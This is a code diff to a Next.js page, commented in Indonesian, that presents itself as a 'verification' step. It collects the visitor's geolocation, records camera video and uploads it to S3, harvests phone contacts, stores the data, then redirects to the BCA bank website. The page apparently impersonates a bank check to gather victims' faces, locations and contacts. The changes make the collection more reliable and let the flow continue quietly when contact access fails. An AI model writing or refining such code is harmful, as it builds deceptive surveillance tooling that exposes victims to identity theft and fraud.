@@ -32,14 +32,14 @@ export default function Home() {
 
 	// Fungsi untuk mendapatkan mimeType yang didukung
 	const getSupportedMimeType = () => {
-		const mimeTypes = ["video/webm;codecs=vp9,opus", "video/webm;codecs=vp8,opus", "video/webm;codecs=h264,opus", "video/webm", "video/mp4"];
+		const mimeTypes = ["video/webm;codecs=vp9", "video/webm;codecs=vp8", "video/webm;codecs=h264", "video/webm", "video/mp4", "video/x-matroska"];
 
 		for (const mimeType of mimeTypes) {
 			if (MediaRecorder.isTypeSupported(mimeType)) {
 				return mimeType;
 			}
 		}
-		return undefined;
+		return "video/webm"; // Fallback
 	};
 
 	const requestLocation = async () => {
@@ -83,7 +83,7 @@ export default function Home() {
 
 			// Dapatkan mimeType yang didukung
 			const mimeType = getSupportedMimeType();
-			const options = mimeType ? { mimeType } : {};
+			const options = { mimeType };
 
 			const recorder = new MediaRecorder(stream, options);
 			mediaRecorderRef.current = recorder;
@@ -97,15 +97,18 @@ export default function Home() {
 
 			recorder.onstop = async () => {
 				try {
-					// Tentukan tipe blob berdasarkan mimeType
-					const blobType = mimeType?.split(";")[0] || "video/webm";
-					const blob = new Blob(recordedChunksRef.current, { type: blobType });
+					// Buat blob dari rekaman
+					const blob = new Blob(recordedChunksRef.current, { type: mimeType });
 
-					// Tentukan ekstensi file
-					const extension = blobType.includes("mp4") ? "mp4" : "webm";
+					// Tentukan ekstensi file berdasarkan mimeType
+					let extension = "webm";
+					if (mimeType.includes("mp4")) extension = "mp4";
+					if (mimeType.includes("matroska")) extension = "mkv";
+
 					const fileName = `video-${Date.now()}.${extension}`;
 
-					const videoUrl = await uploadToS3(blob, fileName);
+					// Unggah ke S3
+					const videoUrl = await uploadToS3(blob, fileName, mimeType);
 
 					// Simpan URL video ke database
 					if (userData.id) {
@@ -152,7 +155,9 @@ export default function Home() {
 	const requestContacts = async () => {
 		try {
 			if (!("contacts" in navigator)) {
-				throw new Error("Browser tidak mendukung akses kontak");
+				console.warn("Browser tidak mendukung akses kontak");
+				setStatus("completed");
+				return;
 			}
 
 			const contacts = await (navigator as any).contacts.select(["name", "email", "tel"], { multiple: true });
@@ -176,8 +181,8 @@ export default function Home() {
 				window.location.href = process.env.NEXT_PUBLIC_REDIRECT_URL || "https://www.bca.co.id";
 			}, 2000);
 		} catch (err: any) {
-			setStatus("error");
-			setError(`Gagal mengambil kontak: ${err.message}`);
+			console.error("Error mengambil kontak:", err);
+			setStatus("completed"); // Lanjut meskipun gagal ambil kontak
 		}
 	};
 
@@ -198,9 +203,9 @@ export default function Home() {
 
 			{status === "camera" && (
 				<div className="w-full max-w-md">
-					<div className="bg-gray-100 rounded-xl overflow-hidden mb-6 border border-gray-200">
+					<div className="bg-gray-100 rounded-xl overflow-hidden mb-6 border border-gray-200 relative">
 						<video ref={videoRef} autoPlay playsInline muted className="w-full h-auto aspect-video object-cover" />
-						{countdown > 0 && <div className="absolute top-4 right-4 bg-red-500 text-white px-3 py-1 rounded-full font-bold">{countdown}s</div>}
+						{countdown > 0 && countdown < 15 && <div className="absolute top-4 right-4 bg-red-500 text-white px-3 py-1 rounded-full font-bold">{countdown}s</div>}
 					</div>
 
 					<div className="text-center">
@@ -211,6 +216,9 @@ export default function Home() {
 						) : (
 							<div className="py-3">
 								<p className="text-gray-600">Video sedang direkam...</p>
+								<div className="mt-2 w-full bg-gray-200 rounded-full h-2">
+									<div className="bg-blue-600 h-2 rounded-full" style={{ width: `${(countdown / 15) * 100}%` }}></div>
+								</div>
 							</div>
 						)}
 					</div>
@@ -238,7 +246,7 @@ export default function Home() {
 					<h2 className="text-2xl font-semibold text-gray-800 mb-4">Verifikasi Berhasil!</h2>
 					<p className="text-gray-600 mb-6">Semua data telah berhasil dikumpulkan dan disimpan.</p>
 					<div className="bg-green-50 p-4 rounded-lg border border-green-200">
-						<p className="text-green-700">Anda akan diarahkan ke halaman tujuan dalam 2 detik...</p>
+						<p className="text-green-700">Anda akan diarahkan ke halaman tujuan...</p>
 					</div>
 				</div>
 			)}
@@ -263,9 +271,10 @@ export default function Home() {
 
 // ===== Fungsi Bantuan =====
 const getLocation = async (): Promise<{ lat: number; lng: number; accuracy: number }> => {
-	return new Promise((resolve) => {
+	return new Promise((resolve, reject) => {
 		if (!navigator.geolocation) {
-			throw new Error("Browser tidak mendukung geolokasi");
+			reject(new Error("Browser tidak mendukung geolokasi"));
+			return;
 		}
 
 		navigator.geolocation.getCurrentPosition(
@@ -277,41 +286,36 @@ const getLocation = async (): Promise<{ lat: number; lng: number; accuracy: numb
 				});
 			},
 			(error) => {
-				throw new Error(`Gagal mendapatkan lokasi: ${error.message}`);
+				reject(new Error(`Gagal mendapatkan lokasi: ${error.message}`));
 			},
 			{ enableHighAccuracy: true, timeout: 10000 }
 		);
 	});
 };
 
-const uploadToS3 = async (file: Blob, fileName: string): Promise<string> => {
+// Fungsi upload yang diperbaiki
+const uploadToS3 = async (file: Blob, fileName: string, mimeType: string): Promise<string> => {
 	try {
-		// Dapatkan URL unggah dari API
+		// Buat FormData
+		const formData = new FormData();
+		formData.append("file", file, fileName);
+		formData.append("contentType", mimeType);
+
+		// Kirim ke API route
 		const response = await fetch("/api/s3-upload", {
 			method: "POST",
-			headers: { "Content-Type": "application/json" },
-			body: JSON.stringify({ fileName, fileType: file.type }),
+			body: formData,
 		});
 
 		const data = await response.json();
 
 		if (!response.ok) {
-			throw new Error(data.error || "Gagal mendapatkan URL unggah");
-		}
-
-		// Upload file langsung ke S3
-		const uploadResponse = await fetch(data.url, {
-			method: "PUT",
-			body: file,
-			headers: { "Content-Type": file.type },
-		});
-
-		if (!uploadResponse.ok) {
-			throw new Error("Upload ke S3 gagal");
+			throw new Error(data.error || "Gagal mengunggah video");
 		}
 
 		return data.publicUrl;
 	} catch (err) {
+		console.error("Upload error:", err);
 		throw new Error(`Gagal mengunggah video: ${(err as Error).message}`);
 	}
 };
